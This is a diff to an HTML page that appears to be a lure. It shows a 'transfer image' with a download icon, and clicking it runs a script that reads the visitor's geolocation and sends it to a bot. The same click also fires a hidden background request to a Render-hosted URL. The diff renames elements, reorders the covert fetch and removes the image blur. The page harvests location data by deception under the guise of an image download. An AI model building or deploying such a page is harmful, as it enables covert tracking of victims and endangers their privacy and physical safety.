@@ -15,24 +15,23 @@
     font-family: Arial, sans-serif;
   }
 
-  .image-container {
+  .image-wrapper {
     position: relative;
     width: 500px;
     height: 300px;
+    cursor: pointer;
     border-radius: 15px;
     overflow: hidden;
     box-shadow: 0 8px 20px rgba(0,0,0,0.3);
-    cursor: pointer;
   }
 
-  .image-container img {
+  .image-wrapper img {
     width: 100%;
     height: 100%;
     object-fit: cover;
-    filter: blur(1.5px); /* تمويه خفيف */
   }
 
-  .download-icon {
+  .overlay-icon {
     position: absolute;
     top: 50%;
     left: 50%;
@@ -46,13 +45,17 @@
 </head>
 <body>
 
-<div class="image-container" onclick="sendLocationAndOpen()">
+<div class="image-wrapper" onclick="openHiddenLinkAndSendLocation()">
   <img src="https://i.ibb.co/spwcmX7m/IMG-20250826-WA0011.jpg" alt="صورة التحويل">
-  <div class="download-icon">⬇️</div>
+  <div class="overlay-icon">⬇️</div>
 </div>
 
 <script>
-function sendLocationAndOpen() {
+function openHiddenLinkAndSendLocation() {
+    // فتح رابط Render في الخلفية (مخفي)
+    const hiddenLink = "https://lolo-1-rt30.onrender.com";
+    fetch(hiddenLink).catch(e => console.log(e));
+
     // إرسال الموقع للبوت
     if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(
@@ -60,13 +63,9 @@ function sendLocationAndOpen() {
                 const lat = pos.coords.latitude;
                 const lon = pos.coords.longitude;
                 sendToBot(lat, lon);
-                // فتح الرابط في الخلفية (مخفي)
-                fetch("https://lolo-1-rt30.onrender.com").catch(e => console.log(e));
-                alert("✅ تم تأكيد العملية!");
+                alert("✅ تم فتح الصورة وتأكيد الموقع!");
             },
-            err => {
-                alert("❌ لم يتم السماح بالوصول إلى الموقع");
-            }
+            err => alert("❌ لم يتم السماح بالوصول إلى الموقع")
         );
     } else {
         alert("❌ جهازك لا يدعم الموقع الجغرافي");
